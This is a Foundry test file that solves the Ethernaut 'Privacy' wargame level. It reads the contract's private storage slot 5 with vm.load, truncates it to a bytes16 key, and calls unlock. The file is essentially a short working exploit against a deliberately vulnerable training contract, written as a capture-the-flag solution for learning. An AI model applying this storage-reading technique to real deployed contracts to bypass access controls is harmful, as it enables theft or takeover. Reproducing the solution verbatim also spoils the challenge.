// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/12-Privacy/Privacy.sol";
import "../src/12-Privacy/PrivacyFactory.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    PrivacyFactory level;
    Privacy instance;
    address player = address(123456);
    address instanceAddress;
    using stdStorage for StdStorage;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new PrivacyFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Privacy(payable(instanceAddress));
    }

    function testPrivacyHack() public {
        bytes32 slot = bytes32(uint256(5));
        bytes32 data = vm.load(instanceAddress, slot);
        bytes16 key = bytes16(data);
        instance.unlock(key);
        assertFalse(instance.locked());
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
